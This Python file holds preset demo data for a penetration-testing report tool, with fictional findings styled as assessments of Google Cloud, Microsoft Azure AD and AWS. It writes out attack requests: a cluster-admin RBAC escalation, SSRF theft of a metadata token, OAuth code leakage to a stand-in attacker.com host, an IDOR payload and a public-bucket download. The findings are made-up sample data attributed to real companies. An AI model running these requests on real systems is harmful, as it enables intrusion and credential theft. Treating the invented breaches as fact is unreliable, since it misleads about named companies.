"""
ProofForge AI - Enterprise Company Case Studies & Assessment Presets
Real-world penetration testing assessment scenarios modeled after Google, Microsoft, AWS, and Meta environments.
"""

COMPANY_PRESETS = {
    "Google Cloud Security (Kubernetes & IAM Escape)": {
        "company": "Google Cloud Platform",
        "logo_svg": """<svg width="24" height="24" viewBox="0 0 24 24"><path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.8-2.4 3.66v3.04h3.88c2.27-2.09 3.665-5.17 3.665-9.14z"/><path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.93l-3.88-3.04c-1.08.72-2.45 1.16-4.05 1.16-3.12 0-5.77-2.1-6.72-4.93H1.27v3.13C3.27 21.36 7.34 24 12 24z"/><path fill="#FBBC05" d="M5.28 14.26c-.25-.72-.38-1.49-.38-2.26s.14-1.54.38-2.26V6.61H1.27C.46 8.23 0 10.06 0 12s.46 3.77 1.27 5.39l4.01-3.13z"/><path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.34 0 3.27 2.64 1.27 6.61l4.01 3.13c.95-2.83 3.6-4.99 6.72-4.99z"/></svg>""",
        "scope": "https://gke-cluster.internal.google-corp.net/api/v1/\n10.128.0.0/16 (Cluster Node Pool)",
        "project_name": "Google Anthos Hybrid Cloud Security Assessment",
        "organization": "Google LLC / Alphabet Security Engineering",
        "lead_assessor": "Principal Red Team Engineer (Project Zero Standards)",
        "tier_used": "Pro Max Ultra",
        "notes": """### Finding 1: Kubernetes RBAC ClusterRole Privilege Escalation
Severity: Critical
Target: https://gke-cluster.internal.google-corp.net/api/v1/namespaces/default/serviceaccounts
Port: 443/TCP (HTTPS)
Description: Service account tokens mounted inside the microservices pod have excessive cluster-admin impersonation rights via improper RBAC binding.
Proof of Concept / Raw Evidence:
POST /apis/authorization.k8s.io/v1/selfsubjectaccessreviews HTTP/1.1
Host: gke-cluster.internal.google-corp.net
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6InBvZC1zYSJ9...

Request:
kubectl auth can-i create clusterrolebindings --as=system:serviceaccount:default:worker-sa
Result: yes
Command Execution Output:
kubectl create clusterrolebinding pwned --clusterrole=cluster-admin --serviceaccount=default:worker-sa
Status: 201 Created (Full host takeover achieved)
Impact: Full administrative takeover of the multi-tenant GKE cluster, enabling node traversal, secret dumping, and cross-tenant container execution.
Remediation: Restrict cluster-admin permissions using least-privilege principles. Deploy Google Cloud Pod Security Standards and enforce Gatekeeper OPA policies.

### Finding 2: Server-Side Request Forgery (SSRF) Accessing Metadata Server
Severity: High
Target: https://analytics-ingress.internal.google-corp.net/fetch_webhook?url=http://metadata.google.internal/computeMetadata/v1/
Port: 443/TCP (HTTPS)
Description: The webhook previewer endpoint does not validate outbound destination IP ranges and reflected response headers from the Google Compute Engine internal metadata endpoint.
Proof of Concept / Raw Evidence:
GET /fetch_webhook?url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1
Host: analytics-ingress.internal.google-corp.net
Metadata-Flavor: Google

Response:
HTTP/1.1 200 OK
Content-Type: application/json
{"access_token": "ya29.a0AfH6SMD_k9...", "token_type": "Bearer", "expires_in": 3599}
Impact: Compromise of the primary Compute Engine OAuth2 service account token, allowing lateral movement across Google Cloud IAM project resources.
Remediation: Enable Workload Identity on GKE clusters and require Metadata-Flavor: Google header validation. Restrict egress networking using Cilium network policies.
"""
    },

    "Microsoft MSRC (Azure Active Directory & OAuth2)": {
        "company": "Microsoft Security Response Center",
        "logo_svg": """<svg width="24" height="24" viewBox="0 0 24 24"><path fill="#F25022" d="M1 1h10v10H1z"/><path fill="#7FBA00" d="M13 1h10v10H13z"/><path fill="#00A4EF" d="M1 13h10v10H1z"/><path fill="#FFB900" d="M13 13h10v10H13z"/></svg>""",
        "scope": "https://login.microsoftonline.com/common/oauth2/v2.0/\nhttps://graph.microsoft.com/v1.0/me",
        "project_name": "Microsoft 365 Copilot & Azure Graph API Assessment",
        "organization": "Microsoft Corporation (MSRC)",
        "lead_assessor": "Senior Penetration Tester (OSCP/CRTO)",
        "tier_used": "Pro Max Ultra",
        "notes": """### Finding 1: OAuth2 Authorization Code Interception via Permissive Redirect URI
Severity: High
Target: https://login.microsoftonline.com/oauth2/v2.0/authorize
Port: 443/TCP (HTTPS)
Description: An application registration within Azure AD permitted wildcards in the redirect_uri parameter, allowing OAuth authorization codes to be leaked to external attacker domains.
Proof of Concept / Raw Evidence:
GET /oauth2/v2.0/authorize?client_id=d3b07384d113edec&response_type=code&redirect_uri=https://portal.azure.com.attacker.com/callback&scope=User.ReadWrite.All HTTP/1.1
Host: login.microsoftonline.com

Result:
HTTP/1.1 302 Found
Location: https://portal.azure.com.attacker.com/callback?code=0.AXEA...
Impact: An adversary can exchange stolen auth codes for Microsoft Graph tokens with User.ReadWrite.All scope, compromising corporate email, SharePoint files, and Teams history.
Remediation: Enforce strict, exact-match redirect URIs in Azure AD app registrations. Prohibit wildcard domain patterns.

### Finding 2: Insecure Direct Object Reference (IDOR) in Azure Entra Admin Roles
Severity: Medium
Target: https://portal.azure.com/api/tenant/roles/assign
Port: 443/TCP (HTTPS)
Description: Modifying tenant_id in role assignment JSON payloads allowed assigning directory reader permissions across cross-tenant development sandboxes.
Proof of Concept / Raw Evidence:
POST /api/tenant/roles/assign HTTP/1.1
Host: portal.azure.com
Authorization: Bearer <Tenant_Dev_Token>
Content-Type: application/json

{"tenant_id": "tenant-sandbox-04", "role_id": "Directory.Reader"}
Response:
HTTP/1.1 200 OK
{"status": "assigned", "tenant": "tenant-sandbox-04"}
Impact: Cross-tenant enumeration of user principals and resource groups in linked subscriptions.
Remediation: Validate tenant isolation boundaries in backend middleware before applying role assignments.
"""
    },

    "Amazon Web Services (AWS IAM & S3 Bucket Policy)": {
        "company": "Amazon Web Services",
        "logo_svg": """<svg width="24" height="24" viewBox="0 0 24 24"><path fill="#FF9900" d="M12.93 18.07c-2.43 0-4.66-.7-6.52-1.92l.74-1.22c1.64 1.07 3.59 1.68 5.78 1.68 3.53 0 6.13-1.6 6.13-4.14 0-2.45-2.31-3.6-5.46-4.32l-1.92-.44c-3.7-.84-6.42-2.58-6.42-5.75 0-3.64 3.42-5.96 8.01-5.96 2.15 0 4.14.54 5.76 1.54l-.74 1.25c-1.45-.88-3.21-1.34-5.02-1.34-3.65 0-6.24 1.78-6.24 4.51 0 2.37 2.18 3.5 5.22 4.19l1.92.44c4.02.91 6.66 2.62 6.66 5.88 0 3.86-3.48 5.6-7.89 5.6z"/></svg>""",
        "scope": "https://s3.us-east-1.amazonaws.com/fintech-ledger-backup/\nAWS Account: 123456789012",
        "project_name": "AWS Financial Cloud Compliance Red Team Exercise",
        "organization": "Amazon Web Services Security",
        "lead_assessor": "Principal Cloud Security Architect",
        "tier_used": "Pro Max Ultra",
        "notes": """### Finding 1: Public S3 Bucket Policy Granting Unauthenticated GetObject
Severity: High
Target: https://s3.us-east-1.amazonaws.com/fintech-ledger-backup/
Port: 443/TCP (HTTPS)
Description: The S3 bucket policy contained Principal: * with s3:GetObject allowed on all subkeys, exposing encrypted database snapshots.
Proof of Concept / Raw Evidence:
GET /fintech-ledger-backup/2026-q3-backup.tar.gz HTTP/1.1
Host: s3.us-east-1.amazonaws.com

Response:
HTTP/1.1 200 OK
Content-Type: application/x-gzip
Content-Length: 4829104
[Archive downloaded without AWS Signature V4 authentication]
Impact: Massive unauthenticated data leak violating SOC 2, HIPAA, and PCI-DSS compliance frameworks.
Remediation: Enable S3 Block Public Access at the AWS Account level. Enforce aws:PrincipalOrgID conditions in bucket policies.
"""
    }
}
